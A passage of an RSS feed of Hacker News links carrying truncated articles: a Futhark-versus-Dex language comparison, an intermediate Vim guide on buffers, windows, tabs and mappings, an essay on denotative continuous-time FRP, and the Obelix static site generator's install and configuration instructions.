<p>Most of the translations were pretty simple, for example the <a href="https://futhark-lang.org/examples/dex-mandelbrot.html">Mandelbrot set</a>, <a href="https://futhark-lang.org/examples/dex-pi.html">Monte Carlo pi</a>, and <a href="https://futhark-lang.org/examples/dex-brownian-motion.html">Brownian motion</a> programs. One difference that made me feel <em>major</em> jealousy is that the <code>dex script</code> command is also able to generate <a href="https://google-research.github.io/dex-lang/mandelbrot.html">pleasant reports</a> containing both the code and visualisations and plots of various values. We definitely need a tool like this for Futhark!</p>
<p>The <a href="https://futhark-lang.org/examples/dex-sierpinski.html">Sierpinski triangle</a> program has a fun little detail in Dex, which is that the <code>randIdx</code> function uses the Dex type system to determine the range of the index being produced. While the <code>randIdx</code> function itself can still be wrong, this makes it hard to <em>use</em> it incorrectly. The Futhark translation of <code>randIdx</code> asks the user to pass in a range explicitly, and also returns just an integer.</p>
<h2 id="the-bad-one"><a href="#the-bad-one" id="the-bad-one-link" title="the-bad-one">The bad one</a></h2>
<p>The largest ported example by far is <a href="https://futhark-lang.org/examples/dex-raytrace.html">a ray tracer</a>. It uses ray marching with <a href="https://en.wikipedia.org/wiki/Signed_distance_function">signed distance functions</a> to describe objects. The Dex program rather casually uses the <code>grad</code> operator to apply <a href="https://en.wikipedia.org/wiki/Automatic_differentiation">automatic differentiation (AD)</a> to compute surface normals from the distance function. This is a really elegant technique, but Futhark does not (yet!) have a <code>grad</code> operator. In Futhark, the sensible thing to do is to hard-code the gradient functions for the three different kinds of objects, so of course I instead used <a href="https://futhark-lang.org/examples/dual-numbers.html">forward-mode AD with dual numbers</a> implemented via the Futhark module system. The resulting code finally convinced me that built-in AD is a necessity for a modern numerical languages. I was on the fence before, since I worry that doing it well will be invasive in both the language and compiler, but I never want to write this kind of boilerplate again.</p>
<p>The rest of the ray tracer was fairly straightforward to implement. Dex uses its effect system to implement the loop where the lights in the scene apply their contributions to a given point, which I wrote in Futhark as basically a fold. In fact, I didn’t yet find a Dex example where the effect system was more than a small notational convenience. I’m sure there’s one, though! Effect systems are not things you just add on a lark.</p>
<p>There was one part that confused me initially, but which makes perfect sense in retrospect. The ray tracer normalises the intensity of all pixels (triples of floats) based on the average intensity (unusual I think, but fine). In Dex this is done like this:</p>
<pre><code>image / mean (for (i,j,k). image.i.j.k)</code></pre>
<p>When I first read this, I couldn’t figure out whether it was normalising <em>per channel</em>. I always get a bit wary when overloaded operators like that <code>/</code> are involved. Of course, that <code>for</code>-expression is over a <em>single</em> index that just happens to be a triple, and the components of which are then used to index the three-dimensional <code>image</code> array. It’s really just flattening the array, and the type checker makes the individual <code>i</code>, <code>j</code> and <code>k</code>s take on the appropriate value.</p>
<h2 id="conclusions"><a href="#conclusions" id="conclusions-link" title="conclusions">Conclusions</a></h2>
<p>With respect to expressing parallelism, Dex and Futhark seem equivalent in expressive power, but Dex has the edge in concision. I’d be curious about going the other way, and porting some of the original Futhark benchmark programs <em>to</em> Dex, like <a href="https://github.com/diku-dk/futhark-benchmarks/blob/master/finpar/LocVolCalib.fut">local volumetric calibration</a>.</p>
<p>Dex has several small conveniences over Futhark: while the effect system didn’t matter much for the examples I looked at, Dex’s type classes and broadcasting operators did help a bit with making things more concise.</p>
<p>If you need AD, then Dex is miles ahead of Futhark. While I managed to implement the surface normals in the ray tracer, I gave up on porting <a href="https://google-research.github.io/dex-lang/mcmc.html">mcmc.dx</a> because it contains a higher-order function that applies the <code>grad</code> operator to a functional argument. This would have to be implemented with a higher order parametric module (<a href="https://futhark-lang.org/blog/2019-12-18-design-flaws-in-futhark.html#higher-order-modules">which I wrote were useless not long ago</a>), but I just didn’t have the heart for it. I’ll keep this as a usage case for when we implement AD properly.</p>
<p>I didn’t look much at performance, since Dex is sparsely documented and the benchmarking tools seem to be mostly for internal use. I performed a rough timing of sequential execution of the ray tracer, where the Futhark and Dex versions are about equally fast. Dex also has multi-threaded and CUDA backends, but I …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html">https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html</a></em></p>]]>
            </description>
            <link>https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559967</guid>
            <pubDate>Mon, 28 Dec 2020 15:36:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[21Lessons: What I've Learned from Falling Down the Bitcoin Rabbit Hole]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25559946">thread link</a>) | @noch
<br/>
December 28, 2020 | https://21lessons.com/toc | <a href="https://web.archive.org/web/*/https://21lessons.com/toc">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p> <small> Except where otherwise noted, content on this site is licensed under a <a href="https://creativecommons.org/licenses/by-sa/4.0/" target="_blank">Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0) license</a>. If you like the content on this site, there are many ways to <a href="https://dergigi.com/support">show your support</a>. </small></p><ul><li><a rel="me" href="https://twitter.com/dergigi" target="_blank"><i></i></a></li><li><a rel="me" href="https://bitcoinhackers.org/@dergigi" target="_blank"><i></i></a></li><li><a rel="me" href="https://www.instagram.com/dergigi/" target="_blank"><i></i></a></li><li><a rel="me" href="https://github.com/dergigi" target="_blank"><i></i></a></li><li><a rel="me" href="https://medium.com/@dergigi" target="_blank"><i></i></a></li><li><a rel="me" href="https://dergigi.com/support" target="_blank"><i></i></a></li><li><a rel="me" href="https://www.patreon.com/dergigi" target="_blank"><i></i></a></li></ul><p> <small> Sister projects: <a href="https://bit.ly/21waysbook">21 Ways</a> · <a href="https://bitcoin-resources.com/">Bitcoin Resources</a> · <a href="https://www.bitcoin-quotes.com/">Bitcoin Quotes</a> </small></p><p> <small> Made with 🧡 by <a href="https://dergigi.com/">Gigi</a> </small></p></div></div></div></div>]]>
            </description>
            <link>https://21lessons.com/toc</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559946</guid>
            <pubDate>Mon, 28 Dec 2020 15:33:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Vim Guide for Intermediate Users]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25559878">thread link</a>) | @thunderbong
<br/>
December 28, 2020 | https://thevaluable.dev/vim-intermediate/ | <a href="https://web.archive.org/web/*/https://thevaluable.dev/vim-intermediate/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>
        

        <section>
            
                <picture>
                    
                        <source srcset="https://thevaluable.dev/images/2020/vim_intermediate/vim_coffee.webp" type="image/webp">
                    
                    <img src="https://thevaluable.dev/images/2020/vim_intermediate/vim_coffee.jpg" alt="Intermediate Vim concepts">
                </picture>
            

            <p>Welcome to the second part of this series aimed to make you a better Vim user! If you have no idea about Vim, you should begin with <a href="https://thevaluable.dev/vim-for-beginners/" target="_blank" rel="noopener">the first part</a>. In this article, I’ll explain many more concepts, some of them making Vim truly special compared to other editors. Who wasn’t blown away discovering Vim’s macros?</p>
<p>Specifically, we’ll see together:</p>
<ul>
<li>Ways you can organize open files in Vim using buffers, windows, tabs, and the argument list.</li>
<li>Useful motions to jump quickly from one place to another in your entire codebase.</li>
<li>Mapping new keystrokes to old keystrokes or commands.</li>
<li>Powerful functionalities to repeat some of your keystrokes.</li>
<li>Ways of manipulating the command line history.</li>
<li>Plugins which offers different ways to manage some ideas we saw before.</li>
</ul>
<p>The amount of information in this article can feel overwhelming. My advice: take your time and don’t try to swallow everything at once. Experiment with Vim as you read along, try to understand how it works, and you’ll have a powerful tool you can control entirely with your keyboard.</p>


  






    









<p>You’ll see at the end of each sections some related Vim’s help commands. You can read these help sections directly in Vim when you’re ready to dive deeper.</p>
<h2 id="vims-spatial-organization">Vim’s Spatial Organization</h2>
<p>If you’re using an IDE, you’re certainly used to manage your files with tabs. Vim use other ways to represent and organize open files. Indeed, there are four <a href="https://thevaluable.dev/abstraction-type-software-example/">layers of abstraction</a> you can use for that: the <em>buffers</em>, the <em>windows</em>, the <em>tabs</em>, and the <em>argument list</em>.</p>
<h3 id="buffers">Buffers</h3>
<p>A <em>buffer</em> directly match an open file in memory. To make a comparison with a standard IDE, a buffer would be the <em>content</em> of a tab. The big difference: when you close a tab in an IDE, you close the file as well. Not in Vim; if you close a window containing a buffer, the buffer is still there, <em>hidden</em>.</p>
<p>In fact, a buffer can have three different states:</p>
<ul>
<li><em>active</em> - The buffer is displayed in a window.</li>
<li><em>hidden</em> - The buffer is not displayed, but it exists and the file is still open.</li>
<li><em>inactive</em> - The buffer is not displayed and <em>empty</em>. It’s not linked to any file.</li>
</ul>
<p>The content of a file in a hidden buffer is not directly visible in Vim. At that point, you might wonder: how do we know that this buffer is still open, if we can’t see it?</p>
<p>To see all opened buffered, we can look at the <em>buffer list</em>. You can use the command <code>:buffers</code> to display it. Each line contains:</p>
<ol>
<li>The buffer unique ID.</li>
<li>Indicators displaying different informations (for example <code>a</code> for active, <code>h</code> for hidden, or <code> </code> (space) for inactive).</li>
<li>The name of the buffer, if any. It can be the filepath of the file linked to the buffer.</li>
<li>The line number where the cursor is.</li>
</ol>
<p>For example: <code>27  %a   "layouts/shortcodes/notice.html" line 18</code> means that the buffer ID 27 is in state <code>a</code> (active), its name is <code>layouts/shortcodes/notice.html</code> and the cursor in this specific buffer is on line 18. You can as well know what’s the current buffer displayed with the flag <code>%</code> just before its state.</p>
<p>To navigate through the buffer list, you can use these commands:</p>
<ul>
<li><code>:buffer &lt;ID_or_name&gt;</code>- Move to the buffer using its ID or its name.</li>
<li><code>:bnext</code> or <code>:bn</code> - Move to the next buffer.</li>
<li><code>:bprevious</code> or <code>:bp</code> - Move to the previous buffer.</li>
<li><code>:bfirst</code> or <code>:bf</code> - move to the first buffer.</li>
<li><code>:blast</code> or <code>:bl</code> - move to the last buffer.</li>
<li><code>CTRL-^</code> - switch to the alternative buffer. It’s indicated in your buffer list with the symbol <code>#</code>.</li>
<li><code>&lt;ID&gt;CTRL-^</code> - Switch to a specific buffer with ID <code>&lt;ID&gt;</code>. For example, <code>75CTRL-^</code> switch to the buffer with ID 75.</li>
</ul>
<p>You can as well apply a command to all buffers using <code>:bufdo &lt;command&gt;</code>.</p>
<p>Not all buffers are displayed in the buffer list. To display unlisted buffers, you can use the command <code>:buffers!</code> or <code>ls!</code>. You’ll see unlisted buffer with an indicator <code>u</code> just after its ID.</p>
<p>Now, let’s ask this existential question: how can we create buffers?</p>
<ul>
<li>If you create a window, a buffer will be created automatically (see below).</li>
<li><code>:badd &lt;filename&gt;</code> - Add <code>&lt;filename&gt;</code> to the buffer list.</li>
</ul>
<p>If we can create buffers, we should be able to delete them:</p>
<ul>
<li><code>:bdelete &lt;ID_or_name&gt;</code> - Delete a buffer by ID or name. You can specify more than one ID or name separated with spaces to delete multiple buffers.</li>
<li><code>:1,10bdelete</code> - Delete buffers from ID 1 to 10 included.</li>
<li><code>:%bdelete</code> - Delete all buffers.</li>
</ul>
<p>If you modify a file, forget to save it, and close the window making the buffer hidden, you won’t be able to quit Vim. It will complain that you’re hidden buffer is not saved; to get around that, I would recommend to set the option hidden in your vimrc (by default <code>~/.vimrc</code>), as follow:</p>
<pre><code>set hidden
</code></pre><p>You can try it directly in your current session by running the command <code>:set hidden!</code> to toggle the option on and off. You can play around with it and see what suits best for you.</p>
<p>To see the value of any option, you can use a question mark. For example: <code>:set hidden?</code> or <code>:set filetype?</code>.</p>


  




    





  

<div>
    
    <div>
         <ul>
<li><code>:help buffers</code></li>
<li><code>:help :buffers</code></li>
</ul>
 
    </div>
</div>



<h3 id="windows">Windows</h3>
<p>A window in Vim is nothing more than a space you can use to display the content of a buffer. Don’t forget: when you close the window, the buffer stays open.</p>
<p>When you open Vim, one window with one empty buffer are automatically created.</p>
<p>To create windows, you can use the <code>:new</code> command, or one of these keystrokes:</p>
<ul>
<li><code>CTRL-W s</code> - Split the current window horizontally.</li>
<li><code>CTRL-W v</code> - Split the current window vertically.</li>
<li><code>CTRL-W n</code> - Split the current windows horizontally and edit a new file.</li>
<li><code>CTRL-W ^</code> - Split the current with the <em>alternate file</em> (buffer with the <code>#</code> indicator in your buffer list).</li>
<li><code>&lt;buffer_ID&gt;CTRL-W ^</code> - Split windows with the buffer of ID <code>&lt;ID&gt;</code>. For example, <code>75 CTRL-W ^</code> will open a window with the buffer of ID 75.</li>
</ul>
<p>To move your cursor from one window to another, you can use:</p>
<ul>
<li><code>CTRL-W &lt;Down&gt;</code> or <code>CTRL-W j</code></li>
<li><code>CTRL-W &lt;Up&gt;</code> or <code>CTRL-W k</code></li>
<li><code>CTRL-W &lt;Left&gt;</code> or <code>CTRL-W h</code></li>
<li><code>CTRL-W &lt;right&gt;</code> or <code>CTRL-W l</code></li>
</ul>
<p>You always dreamt to move the windows? Me too. Here’s how to do it:</p>
<ul>
<li><code>CTRL-W r</code> - Rotate the windows.</li>
<li><code>CTRL-W x</code> - Exchange with the next window</li>
</ul>
<p>Who wants windows without being able to resize them? Here are the keystrokes you need:</p>
<ul>
<li><code>CTRL-W =</code> - Resize windows for them to fit on the screen with the same size.</li>
<li><code>CTRL-W -</code> - Decrease window’s height.</li>
<li><code>CTRL-W +</code> - Increase window’s height.</li>
<li><code>CTRL-W &lt;</code> - Decrease window’s width.</li>
<li><code>CTRL-W &gt;</code> - Increase window’s width.</li>
</ul>
<p>Using these keystrokes to move the cursor from window to window and to move the windows themselves is pretty tedious . We’ll see later a plugin which can help to make the whole operation smoother.</p>
<p>If you want to quit windows, you can use the commands:</p>
<ul>
<li><code>:q</code> - To <code>q</code>uit the current window. People lied to you! <code>:q</code> doesn’t quit Vim, but a window. You quit Vim only if there is only one window open.</li>
<li><code>:q!</code> - To <code>q</code>uit the current window, even if there is only one window open with an unsaved buffer<code>!</code>.</li>
</ul>


  




    





  

<div>
    
    <div>
         <ul>
<li><code>:help windows</code></li>
<li><code>:help opening-window</code></li>
<li><code>:help window-move-cursor</code></li>
<li><code>:help window-moving</code></li>
<li><code>:help window-resize</code></li>
</ul>
 
    </div>
</div>



<h3 id="tabs">Tabs</h3>
<p>We saw that a buffer is an open file, and a window is the container for an active buffer. We can see tabs as a container for a bunch of windows. In that way, it’s very different than the concept of tabs in a standard IDE!</p>
<p>Here are the commands to create and delete tabs:</p>
<ul>
<li><code>:tabnew</code> or <code>:tabe</code> - Open a new tab.</li>
<li><code>:tabclose</code> or <code>:tabc</code> - Close the current tab.</li>
<li><code>:tabonly</code> or <code>:tabo</code> - Close every other tab except the current one.</li>
</ul>
<p>To move from tab to tab, you can use these keystrokes:</p>
<ul>
<li><code>gt</code> - <code>g</code>o to the next <code>t</code>ab.</li>
<li><code>gT</code> - <code>g</code>o to the previous tab.</li>
</ul>
<p>You can as well add a count before the last two keystrokes. For example, <code>1gT</code> go to the first tab. Yep, tabs are indexed from 1.</p>


  




    





  





<h3 id="argument-list-arglist">Argument List (arglist)</h3>
<p>The argument list (also called arglist) is the fourth and last container allowing you to organize your open files. It’s useful to see it as a <em>stable subset</em> of the buffer list, as Drew Neil point it out in <a href="http://vimcasts.org/episodes/meet-the-arglist/" target="_blank" rel="noopener">one of his vimcast</a>. As a result, it follows these two rules:</p>
<ol>
<li>Every file in the arglist will be in the buffer list.</li>
<li>Some files in the buffer list won’t be in the arglist.</li>
</ol>
<p>The files you want to open when you run Vim - such as executing <code>vim file1 file2 file3</code> - will be automatically added to the arglist and, as we just saw, to the buffer list.</p>
<p>The arglist can be useful to isolate some files from the buffer list to do some operations on them. Here are some commands you can use to manipulate the arglist:</p>
<ul>
<li><code>:args</code> - Display the arglist.</li>
<li><code>:argadd</code> - Add file to the arglist.</li>
<li><code>:argdo</code> - Execute a command on every file in the arglist.</li>
</ul>
<p>To edit the files in the arglist, you can use these commands:</p>
<ul>
<li><code>:next</code> - Move to the next file in the arglist.</li>
<li><code>:prev</code> - Move to the previous file in the arglist.</li>
<li><code>:first</code> - Move to the first file in the arglist.</li>
</ul>
<p>I don’t use very often the arglist personally, but many users do. The buffer list can be modified by other actions unrelated directly to buffers, like opening new windows. The arglist stays the same, except if you explicitly modify it. That’s why it’s stable.</p>


  




    





  





<h2 id="mapping-keystrokes">Mapping Keystrokes</h2>
<p>We’ve seen a great deal of keystrokes and commands. It would be nice to be able to modify these keystrokes, or to assign new keystrokes to precise commands.</p>
<p>You can use mapping commands for every Vim mode:</p>
<ul>
<li><code>:nmap</code> - Create new mapping for NORMAL mode.</li>
<li><code>:imap</code> - Create new mapping for INSERT mode.</li>
<li><code>:vmap</code> - Create new mapping for VISUAL mode.</li>
</ul>
<p>It might sound confusing to have different mappings for different modes, but it’s actually very easy to remember, thanks to our muscle memory.</p>
<p>Let’s try an example together by mapping <code>w</code> to <code>dd</code>. By default, <code>dd</code> delete a line, and <code>w</code> is a motion to move your cursor from word to word.</p>
<ol>
<li>Run the command <code>:nmap w dd</code></li>
<li>Try to hit the keystroke <code>dd</code>. It will delete a line.</li>
<li>Try to hit <code>w</code>. It deletes a line to.</li>
</ol>
<p>However, <code>w</code> can’t be used anymore to move from word to word. Let’s try to fix that by running: <code>:nmap w v</code>.</p>
<p>Try to hit <code>v</code> now. It deletes a line too! You just did a recursive mapping: <code>v</code> maps to <code>w</code> which maps to <code>dd</code>. It would be …</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thevaluable.dev/vim-intermediate/">https://thevaluable.dev/vim-intermediate/</a></em></p>]]>
            </description>
            <link>https://thevaluable.dev/vim-intermediate/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559878</guid>
            <pubDate>Mon, 28 Dec 2020 15:25:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The misunderstood roots of FRP can save programming (2019)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25559805">thread link</a>) | @Kinrany
<br/>
December 28, 2020 | https://futureofcoding.org/essays/dctp.html | <a href="https://web.archive.org/web/*/https://futureofcoding.org/essays/dctp.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <nav>
        <a href="https://futureofcoding.org/">Future of Coding</a>
        <a href="https://futureofcoding.org/community">Community</a>
        <a href="https://futureofcoding.org/episodes">Podcast</a>
        <a href="https://futureofcoding.org/catalog">Whole Code Catalog</a>
      </nav>
      

<p><em>This essay was presented at Salon de Refuge 2019, colocated with &lt;Programming&gt; 2019, in Genoa, Italy on April 2nd, under the title <strong>Visual Denotative Programming</strong>. The talk was not recorded but you can <a href="https://www.loom.com/share/936dd606f9d948e194cf39bc353b2816">watch a (rough) practice talk here</a>. The <a href="https://github.com/stevekrouse/futureofcoding.org/files/3085610/Visual.Denotative.Programming.pdf">slides can be found here</a>.</em></p>

<p>For many years I been searching for the perfect paradigm for programming user interfaces. Like many others, I fell in love with FRP with the rise of ReactJS and spent a few years searching for the perfect reactive model. Eventually, I found my way back to the original work on FRP by Conal Elliott. It took me almost a year to make sense of it. This essay attempts to make Conal’s vision more understandable to less mathematically-oriented programmers, and also show how this perspective could be the foundation for a new era of programming, not just with user interfaces, but also multi-node computing, storage, machine learning, etc.</p>

<p>This essay assumes familiarity with:</p>

<ul>
  <li>JavaScript syntax, including Promises,</li>
  <li>a web FRP library, such as ReactJS, VueJS, CycleJS, Redux, or Elm,</li>
  <li>and minimal ML/Haskell syntax, including the <code>Maybe</code> type.</li>
</ul>

<h2 id="modern-reactive-web-programming">Modern Reactive Web Programming</h2>

<p>I fell in love with ReactJS in late 2014. The view is a pure function of state. It was so obviously <em>right</em>.</p>

<p>But of course React isn’t the whole answer. It’s just a view library that keeps the view in sync with state. It’s left open how you manage that state.</p>

<p>Inspired by the Elm Architecture, Redux became the popular answer to the state management question. It puts the state of the entire application into a single object. To affect this global state object, your HTML event handlers emit “actions”, such as <code>{"type": "newTodoItem", "description": "Clean my room"}</code>. You then define a reducer function that modifies the global state each time it receives an action. This architecture initially made a lot of sense to me. One big sell is that its global state object is easily serialized, which enables hot reloading and time-travel debugging.</p>

<p>Unexpectedly, when I tried to make sense of large Redux projects, I found myself getting headaches. I found it difficult to understand how the app fit together, which parts affected which other parts. I began to see that the Redux architecture was <a href="https://futureofcoding.org/papers/comprehensible-frp">simulating global mutable state in a seemingly immutable and functional setting, ruining modularity and comprehensibility</a>.</p>

<p>I eagerly slurped up each new React-inspired framework, such as VueJS and CycleJS, to see if they could finally be the “full solution” to interface development, but none felt quite right.</p>

<p><a href="https://pchiusano.github.io/">Paul Chiusano</a> suggested I read <a href="http://conal.net/">Conal Elliott</a>, the creator of the FRP paradigm. Paul claimed that React and the other JS-based FRP libraries weren’t even ‘true’ FRP. I didn’t like to hear this. I loved React and the FRP I knew. I was reluctant to read <a href="http://conal.net/papers/icfp97/">a stodgy paper from the 90s</a>. But I trusted and respected Paul so I gave it a go.</p>

<p>It was a lot of mathematics and strange symbols. What’s a “least upper bound” and “pointed CPO”? My eyes glazed over. I tried a more <a href="http://conal.net/papers/push-pull-frp/">recent paper he wrote on FRP</a>, but it was full of scary Applicative Functors and Monads. I gave up.</p>

<p>However, I couldn’t escape HN comments alluding to “<a href="https://hn.algolia.com/?sort=byPopularity&amp;prefix&amp;page=0&amp;dateRange=all&amp;type=comment&amp;query=real%20frp">real</a>” or “<a href="https://hn.algolia.com/?sort=byPopularity&amp;prefix&amp;page=0&amp;dateRange=all&amp;type=comment&amp;query=original%20frp">original</a>” FRP. They were annoying enough to send me back to Conal for another try. This time I printed out all his papers, determined to make sense of them!</p>

<p><img src="https://user-images.githubusercontent.com/2288939/41498690-cb736744-7141-11e8-98b3-634d0b630f9e.png" alt=""></p>

<p>I took my time with the unfamiliar mathematical and typeclass concepts. With a lot of focused reading, it finally began to click.</p>

<h2 id="dctp-denotative-continuous-time-programming">DCTP: Denotative Continuous-Time Programming</h2>

<p>It’s important to distinguish between the <a href="https://medium.com/@andrestaltz/why-i-cannot-say-frp-but-i-just-did-d5ffaa23973b">many flavors of FRP</a>. The name originally comes from Conal Elliott and Paul Hudak’s work in the 90s . The term has since been stretch so far beyond its original meaning that Conal has <a href="https://stackoverflow.com/questions/5385377/the-difference-between-reactive-and-functional-reactive-programming/5386908#5386908">retreated to a new phrase</a> to describe his original vision: Denotative Continuous Time Programming (DCTP).</p>

<h2 id="d-is-for-denotative">D is for Denotative</h2>

<p>The D of DCTP has similarly nuanced intellectual roots. It stands for “denotative”, a term <a href="https://www.cs.cmu.edu/~crary/819-f09/Landin66.pdf">Peter Landin proposed</a> as a an alternative to “nonprocedural”, “functional” or “declarative”, which lack precise definitions. A denotative programming language is one where:</p>

<blockquote>
  <p>(a) each expression has a nesting subexpression structure,</p>
</blockquote>

<p>Unlike most programming languages which have a mix of statement commands and expressions, denotative programming languages live solely in the world of expressions. For example, instead of if-statements, there are ternary expressions. Instead of loops, recursion. Nested mathematical-like expressions are the only way to construct programs, and thus a program is simply one large, nested expression.</p>

<blockquote>
  <p>(b) each subexpression denotes something (usually a number, truth value or numerical function),</p>
</blockquote>

<p>Additionally, the components of denotative languages must <em>denote</em> some mathematical object. This was directly inspired by Chris Strachey and Dana Scott’s work from the early 1970’s on denotational semantics, an approach to modeling programming languages with mathematical objects. But where denotational semantics was originally created as a way to <em>analyze all programming languages</em>, denotative programming languages are a very specific kind of language, purposefully designed to be well-suited for mathematical reasoning.</p>

<p>For example, a map (“object” in JavaScript, “dictionary” in Python) in a denotative language could <em>denote</em> a <em>mathematical function</em> of keys to <code>Maybe</code> values. The empty map would be <code>key =&gt; Nothing</code>, returning <code>Nothing</code> for any key. Inserting a key, value pair could be: <code>(map, key, value) =&gt; (key' =&gt; key === key' ? Just value : map(key))</code>, which wraps an old map function with a new key comparison, but delegates to the old function for the remaining keys.</p>

<p>This map need not be <em>implemented</em> in such an inefficient way for a language to qualify as denotative.  Denotations are specifications, describing the <em>what</em>, but leaving the <em>how</em> open. Implementations of denotative languages can be as as non-denotative as efficiency concerns demand. A common misunderstanding of the denotative approach is that it’s impractical to eschew statements, because statements must be executed eventually for computation to be carried out. This is of course true, but the distinction is that in denotative languages, statements live in the implementation of the language instead of in the language itself.</p>

<p>For example, even non-denotative languages have functions like <code>pow</code>, <code>sqrt</code>, <code>log</code>, <code>sin</code>, and <code>cos</code>, which denote their equivalent mathematical operations. Users of these functions are free to treat them as true expressions, without having to worry about their potentially non-denotative implementation details. Do they use specially-designed hardware? Loops? It doesn’t matter: users are free to write <code>log(x) + sin(y)</code> and the language’s compiler or interpreter will execute these expressions with whatever non-denotative algorithm is most efficient, as long as it meets the denotative specification for <code>log</code> and <code>sin</code>.</p>

<p>From the denotative perspective, anywhere an operation does not meet its denotative equivalent is a bug. This would include anywhere floating-point math is used, which causes, for example,  <code>0.1 + 0.2</code> to equal <code>0.30000000000000004</code>. In other words, all the quirks of math you need to learn <em>above and beyond what you already learned in algebra class</em> is considered incidental complexity. On the other hand, non-denotative languages aren’t trying to be denotative, so it’s not entirely fair to rank them according to a rubric they are not aiming for.</p>

<blockquote>
  <p>(c) the thing an expression denotes, i.e., its “value”, depends only on the values of its subexpressions, not on other properties of them.</p>
</blockquote>

<p>The final criteria is that expressions in denotative languages are entirely self-contained. There’s no action-at-a-distance. There’s no way to call <code>someValue.update()</code>. For one, that would be a statement. But additionally, all possible ways <code>someValue</code> updates need to be defined in one of the sub-expressions of <code>someValue</code> itself.</p>

<p>In summary, a denotative language is a pure functional language, with the addition of point (b): mathematical denotations.</p>

<h3 id="benefits-of-denotative-programming">Benefits of Denotative Programming</h3>

<p>Programmers spend roughly <a href="http://www.humane-assessment.com/guide/assessment-costs/">50% of their time reading code</a>, so a language that better lends itself to comprehensibility is a boon for productivity.</p>

<p>Denotative languages better convey the global structure of a program. We can <em>fully</em> understand an expression by its subexpressions, and their subexpressions, recursively. There are no spooky action-at-a-distance side-effects that can manipulate things from afar. We don’t have to read the entire codebase to ensure we understand a single piece; we must merely read its subexpressions, recursively. This allows us to quickly rule out what we do and do not need to read, saving us a lot of time in large codebases. A denotative language resembles a dictionary or encyclopedia, where one can understand an entry by reading it and what it references. A non-denotative language resembles prose, like a novel, which you have to read cover-to-cover to know what happens, even if you only care about one specific character.</p>

<p>These comprehensibility benefits extend to local analysis as well. In denotative programming, the equal sign means what it does in a mathematics textbook: we can replace instances of the left with the expression to the right. This is known as referential transparency. We can safely refactor:</p>

<div><div><pre><code><span>b</span> <span>=</span> <span>f</span><span>(</span><span>a</span><span>)</span>
<span>c</span> <span>=</span> <span>g</span><span>(</span><span>b</span><span>)</span>
<span>d</span> <span>=</span> <span>h</span><span>(</span><span>c</span><span>)</span>
</code></pre></div></div>

<p>to:</p>



<p>True equality is also a boon for performance optimizations, which is about replacing sections of programs with equivalent but faster sections. When your code is free of operational concerns, the language implementer is able to make more interesting optimizations. The flip-side is that because the denotative approach cuts us off from these implementation details, it lessens the ability of a user of a denotative language to improve the performance of their programs. However, programmer time is often more …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://futureofcoding.org/essays/dctp.html">https://futureofcoding.org/essays/dctp.html</a></em></p>]]>
            </description>
            <link>https://futureofcoding.org/essays/dctp.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25559805</guid>
            <pubDate>Mon, 28 Dec 2020 15:17:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Obelix, a simple and extensible static site generator]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25559551">thread link</a>) | @jdormit
<br/>
December 28, 2020 | https://obelix-site-builder.github.io/obelix/ | <a href="https://web.archive.org/web/*/https://obelix-site-builder.github.io/obelix/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <p>
        <img src="https://obelix-site-builder.github.io/obelix/images/obelix.jpg" alt="obelix the gaul">
      </p>
      <p>Obelix is a <a href="https://www.netlify.com/blog/2020/04/14/what-is-a-static-site-generator-and-3-ways-to-find-the-best-one/">static site generator</a>. Its primary goals are simplicity, ease of use, and extensibility.</p>
      <p>In a nutshell, a static site generator transforms a set of input data into static assets (HTML, CSS, JavaScript, images, etc.) ready to be served by a web server. The input data can come from a wide variety of sources, from local files on disk to APIs.</p>
      <p>Out of the box, Obelix supports:</p>
      <ul>
        <li><a href="https://commonmark.org/">CommonMark</a>-compliant markdown rendering</li>
        <li>Page and post metadata via <a href="https://rollout.io/blog/yaml-tutorial-everything-you-need-get-started/">YAML</a> frontmatter</li>
        <li>String templating powered by <a href="https://handlebarsjs.com/">Handlebars</a></li>
        <li>Layout templates to apply a common layout to the whole site or a subdirectory</li>
        <li>List templates to render index pages, feeds, or any other listing of a subdirectory</li>
        <li>A powerful plugin system that allows developers to write JavaScript to pull in data from external APIs, transform existing data before it gets rendered, or anything else you can imagine</li>
      </ul>
      <h2>Installation</h2>
      <p>Obelix is available <a href="https://npmjs.org/obelix">on NPM</a>. It's meant to be installed globally:</p>
      <pre><code>$ sudo npm install -g obelix
</code></pre>
      <h2>Getting started</h2>
      <p>An Obelix site consists of a directory containing the source files for the website and an <code>obelix.json</code> configuration file. At a minimum, this file needs to contain two keys, <code>"src"</code> and <code>"out"</code>:</p>
      <pre><code>{
    "src": "source",
    "out": "build"
}
</code></pre>
      <p>The <code>"src"</code> key should be the relative path to the directory where your site's source files live. The <code>"out"</code> key is the relative path to the directory where Obelix will output the built site. For example, the directory for the site described by the <code>obelix.json</code> above might look like this:</p>
      <pre><code>.
├── obelix.json
└── source
    ├── index.md
    └── # all site source files here
</code></pre>
